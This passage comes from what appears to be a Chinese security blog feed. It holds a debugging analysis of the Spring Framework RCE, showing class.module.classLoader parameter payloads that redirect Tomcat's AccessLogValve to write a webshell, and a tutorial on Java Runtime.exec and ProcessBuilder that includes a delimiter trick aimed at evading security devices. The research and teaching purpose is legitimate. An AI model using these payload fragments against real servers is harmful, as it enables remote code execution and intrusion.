/><ul><li>getPropertyDescriptor 这个地方可以画重点了，这里可以看到，获取<code>propertyDescriptorCache </code>这个Map对象中的值，key对应这POJO中的字段，但是这里多了一个<code>class</code>键值对。</li></ul><img src="/img/Spring Framework RCE分析/image-20220403001419499.png" alt="image-20220403001419499" style="zoom:50%;" /><p>​    带着class这个键值对的疑惑，回到上一步CachedIntrospectionResults 中，可以看到strongClassCache 中每一个Value对象的<code>propertyDescriptorCache</code>都带有这个class键值对</p><img src="/img/Spring Framework RCE分析/image-20220403001419499.png" alt="image-20220403001419499" style="zoom:50%;" /><h3 id="3-发送class-x参数重新调试"><a href="#3-发送class-x参数重新调试" class="headerlink" title="3. 发送class.x参数重新调试"></a>3. 发送class.x参数重新调试</h3><ul><li>此时在post包中输入class.x=test参数调试进一步分析</li></ul><p>a. 在获取了getPropertyValue()即POJO.Student后，回到getNestedPropertyAccessor 方法，继续执行到<code>this.newNestedPropertyAccessor(value, this.nestedPath + canonicalName + &quot;.&quot;);</code></p><img src="/img/Spring Framework RCE分析/image-20220403001448066.png" alt="image-20220403001448066" style="zoom:50%;" /><p>b. 实例化 newNestedPropertyAccessor 方法，赋值给nestedPa，并再次进入PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath) 的循环调用中，<code>new newNestedPropertyAccessor</code>实例化的一个新对象是包装java.lang.Class的BeanWrapperImpl类</p><img src="/img/Spring Framework RCE分析/image-20220403001504964.png" alt="image-20220403001504964" style="zoom:50%;" /><p>c. 可以看到之前的循环处理x.x.x.x参数名的代码，新的nestedPath，继续调用<code>getFirstNestedPropertySeparatorIndex(propertyPath)</code> 方法</p><img src="/img/Spring Framework RCE分析/image-20220403001525042.png" alt="image-20220403001525042" style="zoom:50%;" /><pre><code> 分析到这里，已经可以发现spring在参数绑定时，对于正常的参数和x.x=aaa这种参数的不同处理</code></pre><h3 id="04-JDK与Bypass"><a href="#04-JDK与Bypass" class="headerlink" title="04. JDK与Bypass"></a>04. JDK与Bypass</h3><p>​    回头看一下CVE-2010-1622发现看的顺畅多了，但是class.classloader用不了了，这里切换到jdk8，在包装对象转换流程中看一下，发现JDK9+多了一个module属性。</p><ul><li><p>JDK8.x获取到的class</p><img src="/img/Spring Framework RCE分析/image-20220403001541124.png" alt="image-20220403001541124" style="zoom:50%;" /><ul><li><p>JDK9+</p><img src="/img/Spring Framework RCE分析/image-20220403001557353.png" alt="image-20220403001557353" style="zoom:50%;" /></li></ul></li></ul><p>​    Class.module是JDK9+后的新特性，JPMS模块化，暂时理解是将以前的classpath的这种统一调用的方法，可扩展为模块化调用</p><h2 id="0x03-利用链构造"><a href="#0x03-利用链构造" class="headerlink" title="0x03 利用链构造"></a>0x03 利用链构造</h2><p>a. 首先在strongClassCache中看一下Class类的propertyDescriptoCache有哪些可以调用的<code>GenericTypeAwarePropertyDescriptor</code>对象</p><img src="/img/Spring Framework RCE分析/image-20220403001616324.png" alt="image-20220403001616324" style="zoom:50%;" /><p>b. 使用<code>class.module.x=test</code>作为参数，请求，在nestedPa这个地方，获取了类型为java.lang.Module的包装类</p><img src="/img/Spring Framework RCE分析/image-20220403001634997.png" alt="image-20220403001634997" style="zoom:50%;" /><p>c. 继续构造class.module.x.x，打开propertyDescriptoCache，看到了<code>classLoader</code></p><img src="/img/Spring Framework RCE分析/image-20220403001653551.png" alt="image-20220403001653551" style="zoom:50%;" /><p>d. 这里也就对应<code>java.lang.Module</code>类中，成员的get方法</p><img src="/img/Spring Framework RCE分析/image-20220403001715044.png" alt="image-20220403001715044" style="zoom:50%;" /><p>e. 这里获取的classLoader是tomcat的类加载器<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>类</p><p>org.springframework.beans.BeanWrapperImpl: wrapping object [org.apache.catalina.loader.ParallelWebappClassLoader@71d41616]</p><img src="/img/Spring Framework RCE分析/image-20220403001733958.png" alt="image-20220403001733958" style="zoom:50%;" /><p>f.参考S2-020在tomcat8中的利用链思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tomcat中的利用链</span><br><span class="line">org.apache.catalina.loader.ParallelWebappClassLoader</span><br><span class="line">  org.apache.catalina.webresources.StandardRoot</span><br><span class="line">    org.apache.catalina.core.StandardContext</span><br><span class="line">      org.apache.catalina.core.StandardHost</span><br><span class="line">        org.apache.catalina.core.StandardPipeline</span><br><span class="line">          org.apache.catalina.valves.AccessLogValve</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001757430.png" alt="image-20220403001757430" style="zoom:50%;" /><p>​    最终的payload也是通过操作tomcat启动后<code>AccessLogValve</code>的对象，指定日志输出位置，并填充日志内容，写入WebShell</p><h3 id="01-相对路径问题"><a href="#01-相对路径问题" class="headerlink" title="01 相对路径问题"></a>01 相对路径问题</h3><pre><code> 这里在debug的时候总是写不到相对目录，后来在调试过程中，发现idea直接部署的项目会临时将配置放在一个缓存路径下，而真实的tomcat部署的项目，可以直接通过webapps/ROOT使用相对路径</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001813935.png" alt="image-20220403001813935" style="zoom:50%;" /><p>​    AccessLogValve中会新建日志文件及路径涉及的文件夹，也就是说指定webapps/自定义一个文件夹就可以，不需要必须有ROOT</p><img src="/img/Spring Framework RCE分析/image-20220403001830287.png" alt="image-20220403001830287" style="zoom:50%;" /><pre><code> AccessLogValve 在getLogFile中会新建目录</code></pre><img src="/img/Spring Framework RCE分析/image-20220403001849265.png" alt="image-20220403001849265" style="zoom:50%;" /><h3 id="02-多次上传的问题"><a href="#02-多次上传的问题" class="headerlink" title="02. 多次上传的问题"></a>02. 多次上传的问题</h3><p>​    第一次发包文件落地后，第二次发包，默认是不新建文件的，这个时候通过指定fileDateFormat=3，tomcat会新建一个文件，文件格式是<code>prefix + fileDateFormat + suffix</code>，fileDateFormat需要满足格式，这里随便输入数字即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;1</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;2</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001924129.png" alt="image-20220403001924129" style="zoom:50%;" /><h3 id="03-特殊符号的问题"><a href="#03-特殊符号的问题" class="headerlink" title="03. 特殊符号的问题"></a>03. 特殊符号的问题</h3><p>​        熟悉access日志的还记得tomcat在配置日志时，通过%h %l %u等获取tomcat解析http后的内置字段，因此pattern中的%会被解析</p><img src="/img/Spring Framework RCE分析/image-20220403002011555.png" alt="image-20220403002011555" style="zoom:50%;" /><p>​    因此需要通过<code>%&#123;headerName&#125;i</code>，获取自定义header字段，通过这种方式将%拼接在pattern中 </p><img src="/img/Spring Framework RCE分析/image-20220403002037838.png" alt="image-20220403002037838" style="zoom:50%;" /><h3 id="04-SpringBoot"><a href="#04-SpringBoot" class="headerlink" title="04. SpringBoot"></a>04. SpringBoot</h3><p>​    SpringBoot中通过class → module → classLoader获取的是应用程序类加载器<code>AppClassLoader</code>；可继续使用的propertyDescriptors很有限，目前没有什么思路</p><img src="/img/Spring Framework RCE分析/image-20220403002059502.png" alt="image-20220403002059502" style="zoom:50%;" /><h2 id="0x04-阶段总结"><a href="#0x04-阶段总结" class="headerlink" title="0x04 阶段总结"></a>0x04 阶段总结</h2><ol><li><p>该漏洞和spring在3月29号更新的反序列化漏洞没有关系，默认spring也没有导入org.springframework.cache ，这次更新修复的是2月19号的一个pr</p><img src="/img/Spring Framework RCE分析/image-20220403002119066.png" alt="image-20220403002119066" style="zoom:50%;" /></li><li><p>目前的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring beans中的参数绑定中存在一个<span class="class"><span class="keyword">class</span>属性</span></span><br><span class="line"><span class="class">  - 通过<span class="title">jdk9</span>的<span class="title">module</span>特性，即<span class="title">class</span>中存在<span class="title">module</span>属性，<span class="title">bypass</span> <span class="title">CVE</span>-2010-1622，调用到<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class">    - 通过操作<span class="title">org</span>.<span class="title">apache</span>.<span class="title">catalina</span>.<span class="title">valves</span>.<span class="title">AccessLogValve</span>，指定日志路径并触发日志写入的操作，传入了<span class="title">webshell</span></span></span><br></pre></td></tr></table></figure></li></ol><p>  整个分析过程中，其实感觉还有利用链可以挖掘，不管这个漏洞危害如何，感觉很有意思；</p><ul><li><p>同时也思考一个问题，挖个漏洞的时候该怎么思考？</p><p>我觉得首先应该有CVE-2010-1622和S2-020的分析经验吧，同时也了解过JDK9+的新特性，或者在调试老洞的时候误用了新的JDK</p></li><li><p>真牛</p></li><li><p>在spring框架调试中感到窒息</p></li></ul><hr><p>参考</p><p>Spring参数绑定：<a href="https://blog.csdn.net/AlbenXie/article/details/108548786">https://blog.csdn.net/AlbenXie/article/details/108548786</a></p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行浅析</title>
      <link href="/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/"/>
      <url>/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>常用的两个类：<code>Runtime</code>、<code>ProcessBuilder</code></p><h2 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h2><blockquote><p><em>Every Java application has a single instance of class Runtime that allows the application to interface with the environment in which the application is running. The current runtime can be obtained from the getRuntime method.（每个Java应用程序都有一个Runtime类的Runtime ，允许应用程序与运行应用程序的环境进行接口。当前运行时可以从getRuntime方法获得。）</em></p></blockquote><ol><li><p>从<code>java.lang.Runtime</code>源码中看到，这个类自JDK1.0就存在了；该类的构造方法是私有的，目的为了不让”任何人”实例化这个类。如果需要得到Runtime类，可以使用静态方法<code>getRuntime()</code>，该方法返回值的是<code>Runtime</code>类型。</p><img src="/img/Java命令执行浅析/01.png" alt="01" style="zoom: 50%;" /></li><li><p>Runtime类中的方法</p><div  align="center">    <img src="/img/Java命令执行浅析/02.jpg" style="zoom: 50%;" /></div></li><li><p>这里重点关注一下<code>exec()</code>方法</p></li></ol><ul><li>Runtime中关于<code>exec()</code>共有6种重载的方法，返回值均为<code>Process</code>类型，也就有6种参数列表</li><li>其中主要有三个参数：command、envp、dir<ul><li><code>command (String/String[])</code>：需要执行的命令</li><li><code>envp (String[])</code>：运行环境的数组，该值为空表示子进程继承当前进程环境</li><li><code>dir (File)</code>：子进程的工作目录，该值为空表示继承当前进程的工作目录</li><li>这里主要区分在于传入的command的类型，分为字符串和字符串数组，envp和dir如果没有指定的话，默认为null</li></ul></li></ul><h3 id="字符串类型的参数"><a href="#字符串类型的参数" class="headerlink" title="字符串类型的参数"></a>字符串类型的参数</h3><ol><li>以调用exec打开计算器为例：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>运行如上代码并调试，跟踪执行流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec(String command)</span><br><span class="line">exec(String command, String[] envp, File dir)</span><br><span class="line">StringTokenizer(command)  <span class="comment">//获取StringTokenizer对象，将command转换为字符串数组</span></span><br><span class="line">exec(String[] command, String[] envp, File dir)</span><br><span class="line">ProcessBuilder(cmdarry).environment().directory().start()</span><br></pre></td></tr></table></figure><ol start="2"><li><p>整个流程会将String类型的命令  –&gt;  通过StringTokenizer处理为字符串数组  –&gt;  调用ProcessBuilder类进行实例化  –&gt;  调用ProcessBuilder的enviroment()、directory()、start()方法；ProcessBuilder的start()方法，返回的是Process对象。</p></li><li><p>实际上<code>Runtime</code>中执行系统命令的exec()方法最终仍然是对ProcessBuilder的调用。关于<code>ProcessBuilder</code>类的使用，先放到后面去分析。</p></li></ol><h3 id="StringTokenizer类"><a href="#StringTokenizer类" class="headerlink" title="StringTokenizer类"></a>StringTokenizer类</h3><ol><li>对于字符串类型的command，Runtime.exec()会通过StringTokenizer类中的方法，进一步分析command在这个过程中被怎样处理了。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime.exec()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>实例化StringTokenizer类  —&gt;  新建String[]类型的变量，长度为command分割后的个数  —&gt;  取分割后的每一段复制为cmdarray数组。        </li></ol><ul><li>实例化SkingTokenizer类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.util.StringTokenizer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str, String delim, <span class="keyword">boolean</span> returnDelims)</span> </span>&#123;</span><br><span class="line">    currentPosition = <span class="number">0</span>;</span><br><span class="line">    newPosition = -<span class="number">1</span>;</span><br><span class="line">    delimsChanged = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.str = str;</span><br><span class="line">    maxPosition = str.length();</span><br><span class="line">    delimiters = delim;</span><br><span class="line">    retDelims = returnDelims;</span><br><span class="line">    setMaxDelimCodePoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码所示，分割为<code> \t\n\r\f</code> 分别对应 空格、制表符、换行符、回车符、换页符。</p><p>实例化的过程中，基本是对一些内部变量的赋值。</p><ul><li>StringTokenizer.countTokens()计算了command根据分割符会被分割的个数，hasMoreTokens()根据之前计算的分割总数和当前的分割次数判断是否继续循环取值，nextToken()则获取分割的内容，添加到cmdarray中。</li><li>分割的过程比较常规，但是回到经常遇到的一个问题：在Runtime.getRuntime.exec()中不能使用某些特殊字符，如 | &amp; ，这是为什么呢？</li></ul><h3 id="调试分析带有特殊字符的命令"><a href="#调试分析带有特殊字符的命令" class="headerlink" title="调试分析带有特殊字符的命令"></a>调试分析带有特殊字符的命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;echo hello &gt; /tmp/success.txt);</span></span><br></pre></td></tr></table></figure><p>下断点进入调试</p><p><img src="/img/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/03.png" alt="03"></p><p>如图所示，命令被分割为<code>new String[]&#123;&quot;echo&quot;, &quot;hello&quot;, &quot;&gt;&quot;, &quot;/tmp/success.txt&quot;&#125; </code>，相当于我们运行如下代码，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// -&gt; 相当于</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;).start();</span><br></pre></td></tr></table></figure><p>看来不是分割字符的问题，实际上执行上面的代码也是不成功的，当然解决方法是使用如下代码执行，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>但是为什么重定符加入后，运行命令失败呢？看来问题在<code>ProcessBuilder</code>这个类的方法中。</p><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><blockquote><p>This class is used to create operating system processes.（这个类用于创建操作系统进程）</p></blockquote><ol><li><p>该类共有两个构造方法，很好理解，分别是String…和List<String>类型的参数列表。传入的command最终均赋值给command变量。</p><p>这里有个有意思的地方，实际上ProcessBuilder自JDK1.5中才有的。那是不是JDK1.5以前Runtime类中没有exec方法呢？或者当时1.5以前的exec()方法，还是有别的运行逻辑 :&gt;</p><img src="/img/Java命令执行浅析/04.png" alt="04" style="zoom:50%;" /></li><li><p><code>ProcessBuilder</code>类中的方法</p></li></ol><img src="/img/Java命令执行浅析/05.png" alt="05" style="zoom:50%;" /><p>首先测试一个常规执行命令的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>).start();</span><br></pre></td></tr></table></figure><h3 id="获取命令执行的返回结果"><a href="#获取命令执行的返回结果" class="headerlink" title="获取命令执行的返回结果"></a>获取命令执行的返回结果</h3><p>总结了四种获取命令执行的数据流</p><ul><li><strong>执行命令</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;ifconfig&quot;</span>);</span><br><span class="line">System.out.println(p.command());</span><br><span class="line">Process process = p.start();</span><br></pre></td></tr></table></figure><ul><li>获取返回结果 - 1</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 2</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Scanner s = <span class="keyword">new</span> Scanner(process.getInputStream());</span><br><span class="line">String result = s.useDelimiter(<span class="string">&quot;\\A&quot;</span>).hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 3</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String result = org.apache.commons.io.IOUtils.toString(process.getInputStream());</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 4</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JDK8+</span></span><br><span class="line">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">StringJoiner stringJoiner = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">reader.lines().iterator().forEachRemaining(stringJoiner::add);</span><br><span class="line">System.out.println(stringJoiner.toString());</span><br></pre></td></tr></table></figure><h3 id="不能直接获取返回结果的命令"><a href="#不能直接获取返回结果的命令" class="headerlink" title="不能直接获取返回结果的命令"></a>不能直接获取返回结果的命令</h3><p>实际上，当我们执行<code>python —version</code>, <code>java -version</code> 这一类非系统命令，而通过运行环境的环境变量中添加的命令时，默认是无法通过 <code>getInputStream()</code>获取数据流的。</p><p>比如如下运行结果，是获取不到结果的。</p><img src="/img/Java命令执行浅析/06.png" alt="06" style="zoom:50%;" /><p>这里可以调用<code>ProcessBuilder.inheritIO()</code>和<code>ProcessBuilder.redirectErrorStream()</code>这两个方法让你看到执行的结果，不过这两个方法也是有区别的。</p><ul><li><p><strong><u>ProcessBuilder.inheritIO()</u></strong></p><blockquote><p>Sets the source and destination for subprocess standard I/O to be the same as those of the current Java process.(将子进程标准I/O的源和目标设置为与当前Java进程的源和目标相同。)</p></blockquote><p>这个方法实际上将子进程运行的结果输出在当前Java进程的输出显示，比如</p><img src="/img/Java命令执行浅析/07.png" alt="07" style="zoom: 50%;" /></li></ul><p>​    如上图所示，实际上并没有通过<code>getInputsStream()</code>取返回结果，但是控制台输出了打印结果。可以看到<code>java -version</code>的结果是<em>红色</em>的，这通常表示是一个异常信息的打印。</p><ul><li><p><strong><u>ProcessBuilder.redirectErrorStream(true)</u></strong></p><blockquote><p>Sets this process builder’s redirectErrorStream property. If this property is true, then any error output generated by subprocesses subsequently started by this object’s start() method will be merged with the standard output, so that both can be read using the Process.getInputStream() method. This makes it easier to correlate error messages with the corresponding output. The initial value is false.</p></blockquote><p>大概的意思是，如果调用该方法且参数为<strong>true</strong> ，<code>start()</code>方法启动的子进程生成的任何错误输出都将与标准输出合并，以便可以使用<code>Process.getInputStream()</code>方法获取结果。</p><img src="/img/Java命令执行浅析/08.png" alt="08" style="zoom: 50%;" /></li></ul><p>那么为什么<code>java -version</code>返回的结果被当做异常信息了呢？调试跟踪看一下是如何运行的。</p><p>跟踪一下运行流程，发现系统的异常打印从<code>forkAndExec()</code>这个方法后出现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder.start()</span><br><span class="line">ProcessImpl.start(...)</span><br><span class="line"><span class="keyword">new</span> UNIXProcess(...)</span><br><span class="line">pid = forkAndExec(...)</span><br></pre></td></tr></table></figure><img src="/img/Java命令执行浅析/09.png" alt="09" style="zoom: 50%;" /><p>这里<code>forkAndExec()</code> 的修复符是<code>native</code> ，相当于实际上运行<code>forkAndExec</code>时会调用C语言实现相应的功能。对应的源码可参照<code>openjdk8/openjdk/jdk/src/solaris/native/java/lang/UNIXProcess_md.c</code> 来阅读。</p><p>总结一下这部分的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-version&quot;</span>);</span><br><span class="line">p.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">Process process = p.start();</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">process.waitFor();</span><br><span class="line">System.out.println(sb.toString());</span><br></pre></td></tr></table></figure><p>补充一下：<code>Process.waitFor()</code>会将当前线程阻塞，直到子进程执行退出</p><h3 id="特殊符号的问题"><a href="#特殊符号的问题" class="headerlink" title="特殊符号的问题"></a>特殊符号的问题</h3><p>回到<code>Runtime.getRuntime().exec()</code>中的问题，为什么带有重定符、管道符等特殊符号的命令不能直接执行呢？</p><p>先执行一下带有重定向符的命令：</p><img src="/img/Java命令执行浅析/10.png" alt="10" style="zoom: 50%;" /><p>返回结果初步判断是将<code>&quot;1&quot; &quot;&gt;&quot; &quot;/tmp/success&quot;</code>作为<code>echo</code>命令的参数来执行了，相当于执行<code>echo 1 &quot;&gt;&quot; /tmp/success</code> 这样的命令</p><img src="/img/Java命令执行浅析/11.png" alt="11" style="zoom:50%;" /><p>继续调试一下</p><img src="/img/Java命令执行浅析/12.png" alt="12" style="zoom: 50%;" /><img src="/img/Java命令执行浅析/13.png" alt="13" style="zoom: 50%;" /><p>在实例化<strong>UNIXProcess</strong>对象后执行子进程时，字节数组第一位是待执行的命令，其他的都作为参数处理，而我理解的<em>命令行</em>中执行的管道符是由于<em>bash</em>或<em>命令提示符</em> 会对管道符、重定向符等特殊符号赋予特殊的含义吧。方法的话可以使用<code>new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&quot;&#125;</code>来避免这些符号带来的困扰。</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><ol><li><p>根据StringTokenizer类中方法，在命令中加入一些不同的分割符能不能绕过一些安全设备的防护呢？估计效果不太好。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;open\t\f\f\t\f\f\f/System/Applications/Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JDK1.5以前没有ProcessBuilder类。</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em><a href="https://download.java.net/openjdk/jdk8">https://download.java.net/openjdk/jdk8</a></em></p><p><em><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a></em></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dnslog平台探索</title>
      <link href="/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/"/>
      <url>/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/</url>
      
